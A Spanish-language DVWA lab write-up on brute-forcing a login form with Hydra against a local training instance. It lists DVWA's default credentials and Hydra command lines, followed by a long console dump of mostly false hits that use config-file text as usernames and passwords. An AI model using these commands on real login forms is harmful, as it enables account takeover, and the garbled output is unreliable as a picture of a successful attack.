# 🔐 DVWA - Brute Force

## 📌 Descripción
La vulnerabilidad **Brute Force** ocurre cuando un formulario de autenticación no implementa controles adecuados contra intentos repetidos de login.  
Esto permite a un atacante probar múltiples combinaciones de usuario y contraseña hasta encontrar las correctas.

En entornos reales, este tipo de ataque puede comprometer cuentas críticas, sobre todo si:

- No hay bloqueo de cuenta tras múltiples intentos fallidos.
- No se implementan captchas o retardos entre intentos.
- Se utilizan contraseñas débiles.

---

## 🛠️ Escenario en DVWA

- **Ruta vulnerable:**  
  `http://127.0.0.1:8080/vulnerabilities/brute/`
  
- **Nivel de seguridad:** LOW (a propósito, no hay protección contra intentos ilimitados).

- **Usuarios válidos conocidos (según DVWA):**
  
  - `admin : password`
  - `gordonb : abc123`
  - `1337 : charley`
  - `pablo : letmein`
  - `smithy : password`

---

## 🔎 Paso 1: Reconocimiento manual

Abrimos la URL en el navegador y observamos un **formulario de login simple**:

- Campos: `username`, `password`
- Botón de "Login"

Probamos manualmente con un usuario correcto (`admin : password`) para verificar que funciona.

---

## 🔑 Paso 2: Ataque con Hydra

Usamos `hydra` para automatizar intentos de login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-V -I -t 4 -s 8080
```

**Explicación:**

- -l admin → usuario fijo.

- -P → diccionario de contraseñas.

- http-post-form → ataque contra un formulario POST.

- /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed

  - Ruta vulnerable.

  - ^USER^ y ^PASS^ son reemplazados por Hydra.

  - "Login failed" es el texto que aparece cuando falla el login (Hydra lo usa para distinguir intentos válidos).

- -t 4 → número de hilos concurrentes.

- -s 8080 → puerto donde corre DVWA.

<img width="935" height="356" alt="imagen" src="https://github.com/user-attachments/assets/7553c703-b71f-4698-af37-7a71998817b8" />

<img width="360" height="333" alt="imagen" src="https://github.com/user-attachments/assets/adf525fe-c123-4198-b44d-398ad5f3e71c" />

## 🔎 Paso 3: Ataque con diccionario de usuarios y contraseñas

Si no sabemos usuarios válidos, podemos probar con diccionarios:

```bash
hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-V -I -t 4 -s 8080
```

Donde:

- users.txt → contiene posibles nombres de usuario.
- passwords.txt → contiene posibles contraseñas.

Salida consola:

<reason>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  GLINE <user@host mask or nick> [time] <reason>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 561540 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  GLINE <user@host mask or nick> [time] <reason>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "  (Adds a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 561865 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  GLINE <user@host mask or nick> [time] <reason>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "  (Adds a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 561866 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  GLINE <user@host mask or nick> [time] <reason>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "  (Adds a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 561867 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  GLINE <user@host mask or nick> [time] <reason>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "  (Adds a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 561868 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "  (Adds a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          GLINE -<user@host mask> (Removes a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 562193 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "  (Adds a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          GLINE -<user@host mask> (Removes a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 562194 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "  (Adds a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          GLINE -<user@host mask> (Removes a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 562195 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "  (Adds a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          GLINE -<user@host mask> (Removes a G:line for user@host)";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 562196 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          GLINE -<user@host mask> (Removes a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Prevents a user from executing ANY command except ADMIN";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 562521 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          GLINE -<user@host mask> (Removes a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Prevents a user from executing ANY command except ADMIN";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 562522 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          GLINE -<user@host mask> (Removes a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Prevents a user from executing ANY command except ADMIN";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 562523 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          GLINE -<user@host mask> (Removes a G:line for user@host)";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Prevents a user from executing ANY command except ADMIN";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 562524 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Prevents a user from executing ANY command except ADMIN";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 562849 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Prevents a user from executing ANY command except ADMIN";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 562850 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Prevents a user from executing ANY command except ADMIN";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 562851 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Prevents a user from executing ANY command except ADMIN";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 562852 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN -<user@host> (Removes the SHUN for user@host)";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 563177 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN -<user@host> (Removes the SHUN for user@host)";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 563178 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN -<user@host> (Removes the SHUN for user@host)";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 563179 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "          SHUN -<user@host> (Removes the SHUN for user@host)";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 563180 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN -<user@host> (Removes the SHUN for user@host)";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " any user from that hostmask from connecting to the network.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 563505 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN -<user@host> (Removes the SHUN for user@host)";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " any user from that hostmask from connecting to the network.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 563506 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN -<user@host> (Removes the SHUN for user@host)";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " any user from that hostmask from connecting to the network.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 563507 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "          SHUN -<user@host> (Removes the SHUN for user@host)";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " any user from that hostmask from connecting to the network.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 563508 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " any user from that hostmask from connecting to the network.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  AKILL <user@host> :<Reason>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 563833 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " any user from that hostmask from connecting to the network.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  AKILL <user@host> :<Reason>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 563834 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " any user from that hostmask from connecting to the network.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  AKILL <user@host> :<Reason>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 563835 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " any user from that hostmask from connecting to the network.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  AKILL <user@host> :<Reason>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 563836 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  AKILL <user@host> :<Reason>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax: RAKILL <user@host>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 564161 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  AKILL <user@host> :<Reason>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax: RAKILL <user@host>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 564162 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  AKILL <user@host> :<Reason>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax: RAKILL <user@host>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 564163 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  AKILL <user@host> :<Reason>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax: RAKILL <user@host>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 564164 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax: RAKILL <user@host>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills and Restarts the IRC daemon, disconnecting all users";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 564489 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax: RAKILL <user@host>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills and Restarts the IRC daemon, disconnecting all users";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 564490 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax: RAKILL <user@host>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills and Restarts the IRC daemon, disconnecting all users";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 564491 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax: RAKILL <user@host>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills and Restarts the IRC daemon, disconnecting all users";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 564492 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills and Restarts the IRC daemon, disconnecting all users";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills the IRC daemon, disconnecting all users currently on that server.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 564817 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills and Restarts the IRC daemon, disconnecting all users";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills the IRC daemon, disconnecting all users currently on that server.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 564818 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills and Restarts the IRC daemon, disconnecting all users";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills the IRC daemon, disconnecting all users currently on that server.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 564819 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills and Restarts the IRC daemon, disconnecting all users";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Kills the IRC daemon, disconnecting all users currently on that server.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 564820 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills the IRC daemon, disconnecting all users currently on that server.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " With this command you can change your Ident (Username).";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 565145 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills the IRC daemon, disconnecting all users currently on that server.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " With this command you can change your Ident (Username).";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 565146 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills the IRC daemon, disconnecting all users currently on that server.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " With this command you can change your Ident (Username).";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 565147 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Kills the IRC daemon, disconnecting all users currently on that server.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " With this command you can change your Ident (Username).";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 565148 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " With this command you can change your Ident (Username).";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the hostname of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 565473 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " With this command you can change your Ident (Username).";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the hostname of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 565474 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " With this command you can change your Ident (Username).";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the hostname of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 565475 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " With this command you can change your Ident (Username).";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the hostname of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 565476 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the hostname of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Ident of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 565801 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the hostname of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Ident of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 565802 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the hostname of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Ident of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 565803 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the hostname of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Ident of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 565804 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Ident of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 566129 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Ident of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 566130 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Ident of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 566131 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Ident of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 566132 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 566457 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 566458 of 577936 [child 2] (0/0)
